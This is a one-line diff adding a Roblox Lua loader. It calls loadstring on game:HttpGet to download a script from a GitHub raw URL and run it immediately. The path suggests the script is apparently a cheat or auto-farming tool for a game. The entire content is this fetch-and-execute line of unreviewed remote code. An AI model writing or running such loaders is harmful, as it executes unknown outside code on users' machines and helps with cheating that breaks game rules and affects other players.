@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/ch2-chop-a-forest-spam2-ag3qesyxkxw6l7.lua"))()
